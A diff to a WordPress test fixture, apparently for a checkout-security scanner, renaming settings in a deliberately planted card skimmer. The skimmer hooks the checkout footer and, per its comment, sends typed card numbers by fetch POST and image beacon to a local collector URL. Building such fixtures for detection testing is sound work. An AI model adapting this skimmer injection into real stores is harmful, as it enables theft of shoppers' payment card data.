@@ -6,13 +6,13 @@
  *
  *  Adapted from woo-checkout-scanner/test-fixtures/test-skimmer.functions.php.
  *
- *  Off unless the option pnakotic_test_skimmer is "1":
- *      docker compose run --rm wpcli option update pnakotic_test_skimmer 1
+ *  Off unless the option mandacaru_test_skimmer is "1":
+ *      docker compose run --rm wpcli option update mandacaru_test_skimmer 1
  *
  *  Unlike the original it sends what is typed into the card number field (so
- *  Pnakotic's test-card exfiltration check has something to find), but only to
- *  the testbed's collector on 127.0.0.1 (a different host from the store's localhost) (PNAKOTIC_COLLECTOR_URL, or the option
- *  pnakotic_test_skimmer_url). On blur of the card number field and on a Place
+ *  Mandacaru's test-card exfiltration check has something to find), but only to
+ *  the testbed's collector on 127.0.0.1 (a different host from the store's localhost) (MANDACARU_COLLECTOR_URL, or the option
+ *  mandacaru_test_skimmer_url). On blur of the card number field and on a Place
  *  Order click it makes one fetch POST and one image beacon.
  *
  *  Works in the classic and the block checkout: listeners sit on the document
@@ -22,16 +22,16 @@
 
 add_action( 'wp_footer', function () {
 
-	if ( get_option( 'pnakotic_test_skimmer' ) !== '1' ) {
+	if ( get_option( 'mandacaru_test_skimmer' ) !== '1' ) {
 		return;
 	}
 	if ( ! function_exists( 'is_checkout' ) || ! is_checkout() ) {
 		return;
 	}
 
-	$exfil_url = get_option( 'pnakotic_test_skimmer_url' );
+	$exfil_url = get_option( 'mandacaru_test_skimmer_url' );
 	if ( ! $exfil_url ) {
-		$exfil_url = getenv( 'PNAKOTIC_COLLECTOR_URL' ) ? getenv( 'PNAKOTIC_COLLECTOR_URL' ) : 'http://127.0.0.1:8199/collect';
+		$exfil_url = getenv( 'MANDACARU_COLLECTOR_URL' ) ? getenv( 'MANDACARU_COLLECTOR_URL' ) : 'http://127.0.0.1:8199/collect';
 	}
 	?>
 	<script id="pnakotic-test-skimmer">
